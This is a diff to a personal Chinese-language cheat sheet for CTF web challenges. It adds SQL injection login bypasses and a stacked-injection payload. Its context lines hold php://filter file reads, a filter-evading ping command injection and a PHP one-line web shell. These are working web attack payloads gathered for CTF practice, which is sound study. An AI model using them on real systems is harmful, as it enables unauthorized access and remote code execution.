@@ -250,7 +250,8 @@ iconv使用方法见上
 data://text/plain；base64，base64编码的代码#编码后传入绕过字符检测
 4.网页一大堆乱码搜索ctf：ctrl+F
 2026.3.5
-登录问题 用户名直接输入admin'or 1=1#
+1.登录问题 用户名直接输入admin'or 1=1#,密码填写1
+升级版登录：在1的基础上继续查：1'or 1=1 order by 3#
 简单包含/include.php?test=phpinfo.php
 /?file=php://filter/convert.base64-encode/resource=flag.php查看flag
 warmup:目录层数：根目录.www.var.html(包含resource和hint),flag一般在根目录下面，返回四层目录../
@@ -264,3 +265,4 @@ exec：一道ping题
 构造等号绕过：127001;a=g;cat$IFS$@fla$a.php
 在F12查看器中搜索flag找到
 一句话木马：<?php@eval($_POST['attack']);?>
+sql堆叠注入：1;set sql_mode=PIPES_AS_CONCAT;select 1
